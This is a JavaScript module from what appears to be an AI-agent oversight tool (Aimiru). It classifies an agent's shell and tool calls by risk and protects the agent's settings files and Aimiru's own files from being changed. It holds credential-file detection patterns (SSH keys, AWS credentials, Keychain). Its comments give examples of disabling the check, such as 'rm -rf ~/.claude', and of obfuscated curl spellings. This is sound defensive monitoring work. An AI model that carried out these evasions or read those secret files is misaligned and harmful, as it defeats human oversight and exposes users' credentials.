// Maps an agent's tool call to an Aimiru action (spec §8.1 mapping, refined; CONTRACT.md action shape).
//
// Local, deterministic and fast: it runs before every tool call. It errs on the side of the
// stricter class when unsure (spec §0.1.5), because the class decides what fails closed.
//
// Vendored into each connector by scripts/sync-shared.mjs. Edit it only in connectors/shared/.

import { Buffer } from 'node:buffer';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { evidenceText, redactSecrets, shellEvidenceInput, truncate } from './sayso-client.mjs';
import { cartFacts, cleanId, linkSpendRequest, pageCheckoutIn, ucpOperation, ucpProtocol } from './checkout.mjs';

/** Strongest first. When a command does several things, the strongest class wins. */
export const CLASS_ORDER = Object.freeze(['spend', 'send', 'share', 'book', 'delete', 'login', 'write', 'other', 'read']);

export function strongest(...classes) {
  let best = 'read';
  for (const c of classes) {
    if (!c) continue;
    if (CLASS_ORDER.indexOf(c) < CLASS_ORDER.indexOf(best)) best = c;
  }
  return best;
}

// ---------------------------------------------------------------------------
// Hosts
// ---------------------------------------------------------------------------

const PAYMENT_DOMAINS = [
  'stripe.com', 'paypal.com', 'squareup.com', 'braintreegateway.com', 'checkout.com', 'adyen.com', 'razorpay.com',
  'coinbase.com', 'wise.com', 'transferwise.com', 'revolut.com', 'mollie.com', 'gocardless.com', 'lemonsqueezy.com',
  'paddle.com', 'mercury.com', 'brex.com', 'ramp.com', 'dwolla.com', 'paystack.co', 'flutterwave.com', 'klarna.com',
  'plaid.com', 'chargebee.com', 'recurly.com', 'authorize.net', 'payoneer.com', 'venmo.com',
];
const PAYMENT_LABEL = /^(api[a-z0-9-]*|connect|b2b|checkout[a-z0-9-]*|payments?|pay|sandbox[a-z0-9-]*|transfers?|secure)$/;

const MESSAGE_HOSTS = [
  'api.sendgrid.com', 'api.mailgun.net', 'api.eu.mailgun.net', 'api.resend.com', 'api.postmarkapp.com',
  'api.twilio.com', 'api.messagebird.com', 'rest.nexmo.com', 'api.nexmo.com', 'api.vonage.com', 'hooks.slack.com',
  'api.telegram.org', 'graph.facebook.com', 'gmail.googleapis.com', 'api.sparkpost.com', 'api.brevo.com',
  'api.sendinblue.com', 'mandrillapp.com', 'api.pushover.net', 'ntfy.sh', 'api.twitter.com', 'api.x.com',
  'api.linkedin.com', 'api.mailjet.com', 'api.smtp2go.com', 'api.loops.so', 'api.customer.io', 'api.onesignal.com',
  'fcm.googleapis.com', 'api.push.apple.com', 'api.pushbullet.com', 'events.pagerduty.com',
];

export function hostOf(url) {
  try {
    return new URL(url).hostname.toLowerCase();
  } catch {
    return null;
  }
}

export function isPaymentHost(host) {
  if (!host) return false;
  const h = host.toLowerCase();
  for (const d of PAYMENT_DOMAINS) {
    if (h === d) return d === 'authorize.net';
    if (h.endsWith(`.${d}`)) {
      const labels = h.slice(0, -(d.length + 1)).split('.');
      if (labels.some((l) => PAYMENT_LABEL.test(l))) return true;
    }
  }
  return false;
}

export function isMessageUrl(url) {
  const h = hostOf(url);
  if (!h) return false;
  if (MESSAGE_HOSTS.some((m) => h === m || h.endsWith(`.${m}`))) return true;
  let p = '';
  try {
    p = new URL(url).pathname;
  } catch {
    // ignore
  }
  if ((h === 'slack.com' || h.endsWith('.slack.com')) && /^\/api\/(chat\.|files\.upload|conversations\.invite)/.test(p)) return true;
  if ((h === 'discord.com' || h === 'discordapp.com') && /\/api\/(v\d+\/)?(webhooks|channels\/\d+\/messages)/.test(p)) return true;
  if (h === 'graph.microsoft.com' && /sendmail|\/messages\b|\/chats\//i.test(p)) return true;
  if (h === 'api.github.com' && /\/(comments|issues|pulls|releases)\b/.test(p)) return false; // decided by method, see below
  return false;
}

/** Domain-ish counterparty for a URL: "api.stripe.com" -> "stripe.com". */
export function counterpartyOf(url) {
  const h = hostOf(url);
  if (!h) return null;
  // An IP address has no site above it: 127.0.0.1 is itself, never "0.1".
  if (/^\d{1,3}(\.\d{1,3}){3}$/.test(h) || h.startsWith('[')) return h.replace(/^\[(.*)\]$/, '$1');
  const parts = h.split('.');
  if (parts.length <= 2) return h;
  const twoLevel = /^(co|com|org|net|gov|ac)\.[a-z]{2}$/.test(parts.slice(-2).join('.'));
  return parts.slice(twoLevel ? -3 : -2).join('.');
}

const URL_RE = /\b(?:https?|wss?):\/\/[^\s"'`<>()]+/gi;

export function urlsIn(text) {
  return String(text ?? '').match(URL_RE) || [];
}

// ---------------------------------------------------------------------------
// Paths
// ---------------------------------------------------------------------------

/** The project of a session started in the home folder or above it: a folder that cannot exist. */
export const NO_PROJECT_DIR = path.join(path.sep, '.aimiru-no-project');

/**
 * Context for path decisions. For programs the agent wrote (ADR-0090): `inspectProgram(path, kind)`
 * says whether a program a command runs is new (newness.mjs, which only Claude Code and the
 * go-between carry); without it the programs a command runs are not checked for newness, as before
 * (OpenClaw, and Hermes's tables). `sandbox` is true only when the connector knows Claude Code's
 * sandbox holds this command (or a function that says so, asked only when the command runs a new
 * program); `programAllowed(path, sha256)` says whether the person allowed that same file in this
 * session.
 */
export function makePathContext({ projectDir, cwd, home, tmpDirs = [], protectedPaths = [], sandbox = false, programAllowed = null, inspectProgram: inspect = null } = {}) {
  const h = home || os.homedir();
  const homes = macAliases(h);
  const given = path.resolve(projectDir || cwd || process.cwd());
  // The home folder, or a folder above it (/, /Users), is never the project (wave 10 review): an
  // agent started in a new terminal starts there, and ~/Documents is the person's files, not local
  // work. Such a session has no project (a folder that cannot exist), as Codex has none without one.
  const project = macAliases(given).some((g) => homes.some((hh) => isWithin(hh, g))) ? NO_PROJECT_DIR : given;
  // Temp folders: this user's temp folder (TMPDIR) and the shared ones. macOS shows /var as /private/var.
  const temps = new Set();
  for (const t of [os.tmpdir(), '/tmp', '/var/tmp', ...tmpDirs].filter(Boolean)) for (const r of macAliases(t)) temps.add(r);
  return {
    home: h,
    // The home folder as either name macOS gives it, for the work area (wave 10, T7).
    homes,
    project,
    cwd: path.resolve(cwd || given),
    temps: [...temps],
    protectedPaths,
    sandbox: typeof sandbox === 'function' ? sandbox : sandbox === true,
    ...(typeof programAllowed === 'function' ? { programAllowed } : {}),
    ...(typeof inspect === 'function' ? { inspectProgram: inspect } : {}),
  };
}

/** Resolves a shell path word. Returns null when it depends on something unknown ($VAR, $(...)). */
export function resolvePathWord(word, ctx) {
  if (word == null) return null;
  let w = String(word);
  if (!w) return null;
  w = w.replace(/^~(?=$|\/)/, ctx.home).replace(/^\$HOME(?=$|\/)/, ctx.home).replace(/^\$\{HOME\}(?=$|\/)/, ctx.home);
  if (/[$`%]/.test(w)) return null;
  // A Windows absolute path (C:\x, \\server\share) seen on another system is never inside the project.
  if (path.sep === '/' && (/^[A-Za-z]:[\\/]/.test(w) || /^\\\\/.test(w))) {
    return `//windows/${path.win32.normalize(w).replace(/\\/g, '/')}`;
  }
  if (ctx.cwdUnknown && !path.isAbsolute(w)) return null;
  // A glob is resolved to its fixed prefix: "/etc/*.conf" -> "/etc".
  const globAt = w.search(/[*?[]/);
  if (globAt === 0) w = '.';
  else if (globAt > 0) w = w.slice(0, globAt).replace(/[^/]*$/, '') || '.';
  return path.resolve(ctx.cwd, w);
}

/**
 * The path a word written from $HOME or ${HOME} names ("$HOME/Documents", "${HOME}/old"), read
 * as ~ is: the home folder Aimiru knows (a command that sets HOME is a program Aimiru does not know,
 * so it waits on its own). Null for any other word known only when it runs. Agents most often
 * write home paths this way, so a deletion of "$HOME/Documents" names the person's files as
 * "~/Documents" does. Callers use it only to say what a step deletes or where it goes, never to
 * count a word as inside the work area.
 */
export function homePathWord(word, ctx) {
  const w = String(word ?? '');
  if (!/^\$(HOME|\{HOME\})(?=$|\/)/.test(w)) return null;
  return resolvePathWord(w, ctx);
}

function isWithin(p, dir) {
  if (!p || !dir) return false;
  if (p === dir) return true;
  const withSep = dir.endsWith(path.sep) ? dir : dir + path.sep;
  return p.startsWith(withSep);
}

/**
 * A folder and the other name macOS shows it under: /tmp and /var are /private/tmp and
 * /private/var, so a path written either way is the same folder.
 */
function macAliases(dir) {
  const r = path.resolve(dir);
  if (r.startsWith('/private/')) return [r, r.slice('/private'.length)];
  if (/^\/(tmp|var)(\/|$)/.test(r)) return [r, `/private${r}`];
  return [r];
}

/**
 * True when p is inside the project or a temp folder (not the temp root itself). The home folder
 * comes before the temp rule (wave 10, T7): when the home folder sits inside a temp folder (a
 * container, CI, a sandbox), ~/x is the person's files, so deleting it is a deletion, not local
 * work. The nearer folder decides: a temp folder inside the home folder (TMPDIR=~/tmp) is still a
 * temp folder, and the rest of /tmp stays local work.
 */
export function isInsideWorkArea(p, ctx) {
  if (!p) return false;
  if (isWithin(p, ctx.project)) return true;
  const temps = ctx.temps.filter((t) => p !== t && isWithin(p, t));
  if (!temps.length) return false;
  const homes = Array.isArray(ctx.homes) ? ctx.homes : ctx.home ? [path.resolve(ctx.home)] : [];
  const home = homes.find((h) => isWithin(p, h));
  // Inside the home folder, and the home folder is inside (or is) every temp folder p is in.
  if (home && temps.every((t) => isWithin(home, t))) return false;
  return true;
}

/**
 * The maker's settings and Aimiru's own files (CONTRACT.md, "Steps that reach the network", the
 * protected-paths row): Claude Code's settings files (user, project and managed), its plugins folder
 * and .claude.json, Codex's settings and checks in any .codex folder (the home folder's, CODEX_HOME's
 * and a project's, which Codex loads in a trusted project: config.toml, a profile's
 * <name>.config.toml, hooks.json, requirements.toml and the rules folder) and the project's whole
 * .codex folder, Aimiru's own folder (~/.sayso, which holds the runner's folder too: its copy of
 * Aimiru, settings, id and process number) and its data folders under any Claude Code settings folder
 * (plugins/data/aimiru-...), the runner's LaunchAgent (~/Library/LaunchAgents/app.aimiru.runner.plist,
 * which launchd starts at every login: security review of wk/runner), and what the connector adds in
 * ctx.protectedPaths (its data folder and plugin root, CODEX_HOME, the same files under
 * CLAUDE_CONFIG_DIR: makerProtectedPaths). Changing them can turn Aimiru off, for this agent or for
 * another one on the same computer, so every connector protects every maker's files by name (review
 * of wk/connectors-flow, 28 Oct).
 */
export function isProtectedPath(p, ctx) {
  if (!p) return false;
  const norm = p.replace(/\\/g, '/');
  if (/\/\.claude\/settings(\.local)?\.json$/.test(norm)) return true;
  if (/managed-settings(\.json|\.d(\/|$))/.test(norm)) return true;
  if (/\/\.claude\/plugins(\/|$)/.test(norm)) return true;
  if (/\/\.claude\.json$/.test(norm)) return true;
  if (/\/\.codex\/([^/]+\.)?config\.toml$/.test(norm) || /\/\.codex\/(hooks\.json|requirements\.toml)$/.test(norm)) return true;
  if (/\/\.codex\/rules(\/|$)/.test(norm)) return true;
  if (ctx?.project && isWithin(p, path.join(ctx.project, '.codex'))) return true;
  if (/\/plugins\/data\/(aimiru|sayso)-[^/]*(\/|$)/.test(norm)) return true;
  if (/\/\.sayso\//.test(norm) || /\/\.sayso$/.test(norm)) return true;
  if (RUNNER_PLIST_RE.test(norm)) return true;
  return (ctx?.protectedPaths || []).some((pp) => pp && isWithin(p, path.resolve(pp)));
}

/** The runner's LaunchAgent (shared/runner.mjs launchAgentFile), by name. */
const RUNNER_PLIST = 'app.aimiru.runner.plist';
const RUNNER_PLIST_RE = /\/Library\/LaunchAgents\/app\.aimiru\.runner\.plist$/;

/** Claude Code's own files in a settings folder of its own, guarded as ~/.claude's are by name. */
const CLAUDE_CONFIG_FILES = Object.freeze(['settings.json', 'settings.local.json', '.claude.json', 'plugins']);

/**
 * The files in a Claude Code settings folder (CLAUDE_CONFIG_DIR) that Aimiru guards as it guards
 * ~/.claude's: the person's settings, the rest of Claude Code's state, and the installed plugins with
 * their data. Each is named by the folder's name, by its real one when the folder is a link, and by
 * the other name a Mac gives either. Empty without a folder.
 */
export function claudeConfigDirPaths(dir) {
  if (!dir) return [];
  const given = path.resolve(dir);
  let real = given;
  try {
    real = fs.realpathSync(given);
  } catch {
    // the folder is not there yet
  }
  const dirs = [...new Set([given, real].flatMap(macAliases))];
  return dirs.flatMap((d) => CLAUDE_CONFIG_FILES.map((name) => path.join(d, name)));
}

/**
 * Every maker's settings and Aimiru's data that an environment names, for any connector's
 * ctx.protectedPaths (review of wk/connectors-flow, 28 Oct): Claude Code's files under
 * CLAUDE_CONFIG_DIR, its plugin's data folder (CLAUDE_PLUGIN_DATA) and Codex's folder (CODEX_HOME,
 * else ~/.codex). Two agents on one computer, run with each other's settings folders (the Mac run
 * exports all three to both), each protect the other's: one agent cannot switch off the other's check
 * without an ask. ~/.claude's files and every .codex folder's settings are protected by name as well.
 * @param {Record<string, string|undefined>} [env]
 */
export function makerProtectedPaths(env = process.env) {
  const home = env.HOME || env.USERPROFILE || os.homedir();
  const out = claudeConfigDirPaths(env.CLAUDE_CONFIG_DIR);
  if (env.CLAUDE_PLUGIN_DATA) out.push(path.resolve(env.CLAUDE_PLUGIN_DATA));
  out.push(path.resolve(env.CODEX_HOME || path.join(home, '.codex')));
  return out;
}

/** Where Claude Code keeps managed settings (settings reference, "Settings files"): macOS, then Linux and WSL. */
const MANAGED_SETTINGS_DIRS = Object.freeze(['/Library/Application Support/ClaudeCode', '/etc/claude-code']);

/** The protected files and folders a folder may hold, by where they are on this computer. */
function protectedLocations(ctx) {
  const home = ctx?.home || os.homedir();
  const at = [path.join(home, '.claude', 'settings.json'), path.join(home, '.claude', 'settings.local.json'), path.join(home, '.claude', 'plugins'), path.join(home, '.claude.json'), path.join(home, '.sayso'), path.join(home, 'Library', 'LaunchAgents', RUNNER_PLIST)];
  // Codex's settings and checks in the home folder, and the project's whole .codex folder.
  for (const name of ['config.toml', 'hooks.json', 'requirements.toml', 'rules']) at.push(path.join(home, '.codex', name));
  if (ctx?.project) at.push(path.join(ctx.project, '.claude', 'settings.json'), path.join(ctx.project, '.claude', 'settings.local.json'), path.join(ctx.project, '.codex'));
  for (const d of MANAGED_SETTINGS_DIRS) at.push(path.join(d, 'managed-settings.json'), path.join(d, 'managed-settings.d'));
  for (const pp of ctx?.protectedPaths || []) if (pp) at.push(path.resolve(pp));
  return at;
}

/**
 * True when a folder holds one of the protected files or folders that is there: deleting or moving
 * it ("rm -rf ~/.claude", "mv ~/.codex ~/.codex-old") takes them with it, a change to them as much as
 * deleting the file itself.
 */
export function holdsProtectedPath(p, ctx) {
  if (!p) return false;
  return protectedLocations(ctx).some((loc) => loc !== p && isWithin(loc, p) && pathExists(loc));
}

/** True when a place would hold one of the protected files or folders once a folder lands there, there now or not. */
function wouldHoldProtectedPath(p, ctx) {
  if (!p) return false;
  return protectedLocations(ctx).some((loc) => loc !== p && isWithin(loc, p));
}

/** A copy, move or link that takes a whole folder along: mv, ln and ditto always; cp, rsync and Copy-Item when recursive. */
function takesWholeFolders(prog, args) {
  if (['mv', 'move-item', 'ln', 'ditto'].includes(prog)) return true;
  if (prog === 'copy-item') return args.some((a) => /^-r/i.test(a));
  if (prog === 'cp' || prog === 'rsync') return args.some((a) => a === '--recursive' || a === '--archive' || (!a.startsWith('--') && /^-[A-Za-z0-9]*[rRa]/.test(a)));
  return false;
}

/**
 * Where a copy, move or link (cp, mv, ln, rsync, ditto, Copy-Item, Move-Item) lands on the maker's
 * settings or Aimiru's files (isProtectedPath), on a folder that holds them (holdsProtectedPath), or,
 * when it takes a whole folder along, on a place that would hold them once it lands, there now or
 * not (security review, 28 Oct). Into a folder that is there, a source keeps its own name; what a
 * folder holds ("x/", "x/.", ditto, cp -T) lands in the destination itself; otherwise the source
 * becomes the destination. A name Aimiru cannot read (a pattern, a word built when it runs) may be
 * any name in that folder; the shell's patterns skip hidden names unless told otherwise. Null when
 * it lands on none of them.
 */
function landsOnProtected(prog, args, sources, sourcesDyn, dest, ctx, out) {
  const whole = takesWholeFolders(prog, args);
  const reaches = (p) => isProtectedPath(p, ctx) || holdsProtectedPath(p, ctx) || (whole && wouldHoldProtectedPath(p, ctx));
  const asItself = ['cp', 'mv', 'ln', 'install'].includes(prog) && args.some((a) => a === '--no-target-directory' || /^-[A-Za-z]*T/.test(a));
  if (asItself || !isFolder(dest)) return reaches(dest) ? dest : null;
  const dotRule = !['copy-item', 'move-item'].includes(prog) && !(out.seen || []).some((s) => /dotglob|glob_?dots/i.test(s));
  for (let k = 0; k < sources.length; k += 1) {
    const word = String(sources[k] ?? '');
    if (prog === 'ditto' || /(^|[\\/])\.{0,2}$/.test(word)) {
      if (reaches(dest)) return dest;
      continue;
    }
    const name = word.replace(/[\\/]+$/, '').split(/[\\/]/).pop();
    if (!sourcesDyn[k] && !/[*?[{]/.test(name)) {
      const p = path.join(dest, name);
      if (reaches(p)) return p;
      continue;
    }
    for (const loc of protectedLocations(ctx)) {
      if (loc === dest || !isWithin(loc, dest)) continue;
      const child = path.relative(dest, loc).split(path.sep)[0];
      if (!sourcesDyn[k] && !name.includes('{') && !globMatch(name, child, { dotRule })) continue;
      const p = path.join(dest, child);
      if (reaches(p)) return p;
    }
  }
  return null;
}

function pathExists(p) {
  try {
    fs.lstatSync(p);
    return true;
  } catch {
    return false;
  }
}

function isFolder(p) {
  try {
    return fs.statSync(p).isDirectory();
  } catch {
    return false;
  }
}

/** True when free text (inline program code) names one of the protected files or folders. */
export function mentionsProtectedPath(text, ctx) {
  const t = String(text ?? '').replace(/\\\\?/g, '/');
  if (/\.claude\/settings(\.local)?\.json|managed-settings|\.claude\/plugins|\.claude\.json|(^|[\s'"`/])\.sayso([/'"`\s]|$)|app\.aimiru\.runner\.plist/.test(t)) return true;
  // Codex's settings and checks in any .codex folder, a .codex folder named from where the code
  // runs (the project's), and Aimiru's data under any Claude Code settings folder (isProtectedPath).
  if (/\.codex\/(([^/'"`\s]+\.)?config\.toml|hooks\.json|requirements\.toml|rules)|(^|[\s'"`])\.codex\/|plugins\/data\/(aimiru|sayso)-/.test(t)) return true;
  if (ctx?.project && t.includes(path.join(ctx.project, '.codex').replace(/\\/g, '/'))) return true;
  return (ctx?.protectedPaths || []).some((pp) => pp && t.includes(String(pp).replace(/\\/g, '/')));
}

const CREDENTIAL_FILES = [
  /\/\.ssh\/id_[^/]*$/, /\/\.ssh\/[^/]*\.pem$/, /\/\.aws\/credentials$/, /\/\.config\/gcloud\/.*credentials/,
  /\/\.netrc$/, /\/\.git-credentials$/, /\/\.docker\/config\.json$/, /\/\.kube\/config$/, /\/\.npmrc$/,
  /\/\.pypirc$/, /\/Library\/Keychains\//, /\/\.gnupg\/private-keys/, /\/\.config\/gh\/hosts\.yml$/,
];

export function isCredentialFile(p) {
  if (!p) return false;
  const norm = p.replace(/\\/g, '/');
  return CREDENTIAL_FILES.some((re) => re.test(norm));
}

// ---------------------------------------------------------------------------
// A small shell lexer: enough to find programs, arguments and redirections.
// ---------------------------------------------------------------------------

/**
 * Reads an ANSI-C quoted string, $'...', the way bash does: src[start] is just after "$'".
 * Returns the text it stands for and the index of its closing quote (or the end of src).
 * A NUL ends the string in bash; the rest of that quoted part is dropped.
 */
export function decodeAnsiC(src, start) {
  let text = '';
  let cut = false;
  let i = start;
  while (i < src.length && src[i] !== "'") {
    if (src[i] !== '\\' || i + 1 >= src.length) {
      if (!cut) text += src[i];
      i += 1;
      continue;
    }
    const e = src[i + 1];
    i += 2;
    let add;
    switch (e) {
      case 'a': add = '\x07'; break;
      case 'b': add = '\b'; break;
      case 'e':
      case 'E': add = '\x1b'; break;
      case 'f': add = '\f'; break;
      case 'n': add = '\n'; break;
      case 'r': add = '\r'; break;
      case 't': add = '\t'; break;
      case 'v': add = '\v'; break;
      case '\\': add = '\\'; break;
      case "'": add = "'"; break;
      case '"': add = '"'; break;
      case '?': add = '?'; break;
      case 'x': {
        const m = /^[0-9A-Fa-f]{1,2}/.exec(src.slice(i, i + 2));
        if (m) {
          add = String.fromCharCode(parseInt(m[0], 16));
          i += m[0].length;
        } else add = '\\x';
        break;
      }
      case 'u':
      case 'U': {
        const n = e === 'u' ? 4 : 8;
        const m = new RegExp(`^[0-9A-Fa-f]{1,${n}}`).exec(src.slice(i, i + n));
        if (m) {
          const cp = parseInt(m[0], 16);
          add = cp <= 0x10ffff ? String.fromCodePoint(cp) : '�';
          i += m[0].length;
        } else add = `\\${e}`;
        break;
      }
      case 'c': {
        if (i < src.length) {
          const k = src[i];
          i += 1;
          add = k === '?' ? '\x7f' : String.fromCharCode(k.toUpperCase().charCodeAt(0) & 0x1f);
        } else add = '\\c';
        break;
      }
      default:
        if (e >= '0' && e <= '7') {
          const m = /^[0-7]{1,3}/.exec(src.slice(i - 1, i + 2));
          add = String.fromCharCode(parseInt(m[0], 8) & 0xff);
          i += m[0].length - 1;
        } else add = `\\${e}`;
    }
    if (add === '\0') cut = true;
    else if (!cut) text += add;
  }
  return { text, end: i };
}

/** src[start] is just after "(": the text up to the matching ")" and the index after it. */
function matchParen(src, start) {
  let depth = 1;
  let j = start;
  let q = null;
  while (j < src.length && depth > 0) {
    const ch = src[j];
    if (q) {
      if (ch === '\\' && q === '"') j += 1;
      else if (ch === q) q = null;
    } else if (ch === "'" || ch === '"') q = ch;
    else if (ch === '\\') j += 1;
    else if (ch === '(') depth += 1;
    else if (ch === ')') depth -= 1;
    j += 1;
  }
  return { inner: src.slice(start, depth === 0 ? j - 1 : j), next: j };
}

/** The commands a here-document body runs when its delimiter is not quoted: $(...) and `...`. */
function substitutionsIn(text) {
  const found = [];
  let i = 0;
  while (i < text.length) {
    const c = text[i];
    if (c === '\\') {
      i += 2;
      continue;
    }
    if (c === '$' && text[i + 1] === '(') {
      const { inner, next } = matchParen(text, i + 2);
      found.push(inner);
      i = next;
      continue;
    }
    if (c === '`') {
      const end = text.indexOf('`', i + 1);
      found.push(text.slice(i + 1, end === -1 ? text.length : end));
      i = end === -1 ? text.length : end + 1;
      continue;
    }
    i += 1;
  }
  return found;
}

/**
 * True when a word changes before it runs because of unquoted pattern characters: a glob
 * (cur?, c*l, [c]url) or a brace list ({curl,-d,x}, c{u,}rl). mask marks each character of the
 * word "q" (quoted or escaped) or "u" (bare).
 */
function expandsUnquoted(word, mask) {
  let bracket = -1;
  let brace = -1;
  let braceList = false;
  for (let k = 0; k < word.length; k += 1) {
    if (mask[k] !== 'u') continue;
    const ch = word[k];
    if (ch === '*' || ch === '?') return true;
    if (ch === '[') {
      if (bracket < 0) bracket = k;
    } else if (ch === ']') {
      if (bracket >= 0 && k > bracket + 1) return true;
    } else if (ch === '{') {
      brace = k;
      braceList = false;
    } else if (ch === ',' || (ch === '.' && word[k + 1] === '.' && mask[k + 1] === 'u')) {
      if (brace >= 0) braceList = true;
    } else if (ch === '}' && brace >= 0 && braceList) return true;
  }
  return false;
}

/**
 * Splits a shell command into simple commands.
 *
 * Each segment has, per word, whether it depends on something only known when it runs
 * (dynamic: $VAR, $(...), `...`, $"...") and whether bare pattern characters change it
 * (expand: globs and brace lists). ANSI-C quoting ($'\x63url') is decoded, so the word is the
 * text the shell runs. Here-documents are kept on their redirection (body, and whether the
 * delimiter was quoted); `piped` is true when the segment reads the output of the one before.
 * `subst` holds, per word, the text of each command substitution in it ("$(...)" in the word).
 * @returns {{segments: Array<{words: string[], dynamic: boolean[], expand: boolean[], subst: string[][], piped: boolean, redirects: Array<{op: string, target: string, dynamic?: boolean, quoted?: boolean, body?: string}>}>, nested: string[]}}
 */
export function lexShell(input, { powershell = false } = {}) {
  const src = String(input ?? '');
  const segments = [];
  const nested = [];
  let words = [];
  let dynamic = [];
  let expand = [];
  let quoted = [];
  let subst = [];
  let redirects = [];
  let piped = false;
  let call = false; // PowerShell: the segment follows the call operator "&"
  let funcDef = false;
  let cur = '';
  let curMask = '';
  let curDynamic = false;
  // The text of each command substitution in the word, in order ("$(git merge-base HEAD main)").
  let curSubs = [];
  let inWord = false;
  let pendingRedirect = null;
  const heredocs = [];

  const add = (text, quoted) => {
    cur += text;
    curMask += (quoted ? 'q' : 'u').repeat(text.length);
    inWord = true;
  };
  const endWord = () => {
    if (!inWord) return;
    if (pendingRedirect) {
      if (pendingRedirect === '<<' || pendingRedirect === '<<-') {
        const r = { op: pendingRedirect, target: cur, quoted: curMask.includes('q'), body: '' };
        redirects.push(r);
        heredocs.push({ delim: cur, strip: pendingRedirect === '<<-', redirect: r });
      } else redirects.push({ op: pendingRedirect, target: cur, dynamic: curDynamic });
      pendingRedirect = null;
    } else {
      words.push(cur);
      dynamic.push(curDynamic);
      subst.push(curSubs);
      quoted.push(!curMask.includes('u'));
      // PowerShell: "?" and "%" alone are Where-Object and ForEach-Object.
      expand.push(!(powershell && (cur === '?' || cur === '%')) && expandsUnquoted(cur, curMask));
    }
    cur = '';
    curMask = '';
    curDynamic = false;
    curSubs = [];
    inWord = false;
  };
  const endSegment = (nextPiped = false, nextCall = false) => {
    endWord();
    if (words.length || redirects.length) {
      segments.push({ words, dynamic, expand, quoted, subst, redirects, piped, call, funcDef });
      piped = nextPiped;
      call = nextCall;
    } else {
      if (nextPiped) piped = true;
      if (nextCall) call = true;
    }
    funcDef = false;
    words = [];
    dynamic = [];
    expand = [];
    quoted = [];
    subst = [];
    redirects = [];
  };
  const captureParen = (start, inWordSub = false) => {
    // src[start] is just after "(": capture to the matching ")".
    const { inner, next } = matchParen(src, start);
    nested.push(inner);
    if (inWordSub) curSubs.push(inner);
    return next;
  };

  let i = 0;
  while (i < src.length) {
    const c = src[i];
    const next = src[i + 1];
    if (powershell && c === '`') {
      add(next ?? '', true);
      i += 2;
      continue;
    }
    if (c === '\\' && !powershell) {
      if (next === '\n') {
        i += 2;
        continue;
      }
      add(next ?? '', true);
      i += 2;
      continue;
    }
    if (c === "'") {
      const end = src.indexOf("'", i + 1);
      add(src.slice(i + 1, end === -1 ? src.length : end), true);
      i = end === -1 ? src.length : end + 1;
      continue;
    }
    if (c === '"') {
      let j = i + 1;
      while (j < src.length && src[j] !== '"') {
        // The escape character: a backslash in a shell, a backtick in PowerShell ("C:\tools" is literal there).
        if (src[j] === (powershell ? '`' : '\\') && j + 1 < src.length) {
          add(src[j + 1], true);
          j += 2;
          continue;
        }
        if (src[j] === '$' && src[j + 1] === '(') {
          curDynamic = true;
          j = captureParen(j + 2, true);
          add('$(...)', true);
          continue;
        }
        if (src[j] === '`' && !powershell) {
          const end = src.indexOf('`', j + 1);
          nested.push(src.slice(j + 1, end === -1 ? src.length : end));
          curSubs.push(src.slice(j + 1, end === -1 ? src.length : end));
          curDynamic = true;
          add('`...`', true);
          j = end === -1 ? src.length : end + 1;
          continue;
        }
        if (src[j] === '$') curDynamic = true;
        add(src[j], true);
        j += 1;
      }
      inWord = true;
      i = j + 1;
      continue;
    }
    if (!powershell && c === '$' && next === "'") {
      // ANSI-C quoting: $'\x63url' is "curl". Decoded here so the real name is classified.
      const { text, end } = decodeAnsiC(src, i + 2);
      add(text, true);
      i = end + 1;
      continue;
    }
    if (!powershell && c === '$' && next === '"') {
      // $"..." is translated through the locale: what runs may differ from what is written.
      curDynamic = true;
      inWord = true;
      i += 1;
      continue;
    }
    if (c === '$' && next === '(') {
      curDynamic = true;
      add('$(...)', true);
      i = captureParen(i + 2, true);
      continue;
    }
    if (c === '`' && !powershell) {
      const end = src.indexOf('`', i + 1);
      nested.push(src.slice(i + 1, end === -1 ? src.length : end));
      curSubs.push(src.slice(i + 1, end === -1 ? src.length : end));
      curDynamic = true;
      add('`...`', true);
      i = end === -1 ? src.length : end + 1;
      continue;
    }
    if ((c === '<' || c === '>') && next === '(') {
      // Process substitution: the command runs, and bash puts a /dev/fd/N path in its place.
      endWord();
      i = captureParen(i + 2);
      add('/dev/fd/63', true);
      endWord();
      continue;
    }
    if (c === '$') curDynamic = true;
    if (c === '\n') {
      endSegment();
      i += 1;
      // Here-document bodies: kept on their redirection, not read as commands of this shell.
      while (heredocs.length) {
        const { delim, strip, redirect } = heredocs.shift();
        const lines = [];
        while (i < src.length) {
          const lineEnd = src.indexOf('\n', i);
          const line = src.slice(i, lineEnd === -1 ? src.length : lineEnd);
          i = lineEnd === -1 ? src.length : lineEnd + 1;
          if ((strip ? line.trim() : line) === delim) break;
          lines.push(strip ? line.replace(/^\t+/, '') : line);
        }
        redirect.body = lines.join('\n');
        // With a bare delimiter the shell runs $(...) and `...` inside the body.
        if (!redirect.quoted) nested.push(...substitutionsIn(redirect.body));
      }
      continue;
    }
    if (c === ' ' || c === '\t') {
      endWord();
      i += 1;
      continue;
    }
    if (c === '(' && next === ')') {
      // name() { ...; }: a function definition. Its body is read where it is written.
      endWord();
      funcDef = words.length === 1 || (words.length === 2 && words[0] === 'function');
      endSegment();
      i += 2;
      continue;
    }
    if (c === ';' || c === '(' || c === ')') {
      endSegment();
      i += c === ';' && next === ';' ? 2 : 1;
      continue;
    }
    if (c === '&' && next === '&') {
      endSegment();
      i += 2;
      continue;
    }
    if (c === '|' && next === '|') {
      endSegment();
      i += 2;
      continue;
    }
    if (c === '|') {
      endSegment(true);
      i += next === '&' ? 2 : 1;
      continue;
    }
    if (c === '&' && next === '>') {
      endWord();
      const op = src[i + 2] === '>' ? '&>>' : '&>';
      pendingRedirect = op;
      i += op.length;
      continue;
    }
    if (c === '&') {
      endSegment(false, powershell);
      i += 1;
      continue;
    }
    if (c === '>' || c === '<') {
      // An fd number right before a redirection belongs to it ("2>file").
      if (inWord && /^\d+$/.test(cur) && !pendingRedirect) {
        cur = '';
        curMask = '';
        inWord = false;
      } else endWord();
      let op = c;
      let j = i + 1;
      while (j < src.length && (src[j] === '>' || src[j] === '<' || src[j] === '|' || src[j] === '-') && op.length < 3) {
        op += src[j];
        j += 1;
      }
      if (src[j] === '&') {
        // >&2, <&3: duplicating a descriptor, not a file. Input taken from another descriptor
        // still counts as input (see INPUT_REDIRECTS).
        j += 1;
        const start = j;
        while (j < src.length && /[0-9-]/.test(src[j])) j += 1;
        if (op.startsWith('<')) redirects.push({ op: '<&', target: src.slice(start, j) });
        i = j;
        continue;
      }
      pendingRedirect = op === '<<-' || op === '<<' ? op : op.replace(/-$/, '');
      i = j;
      continue;
    }
    add(c, false);
    i += 1;
  }
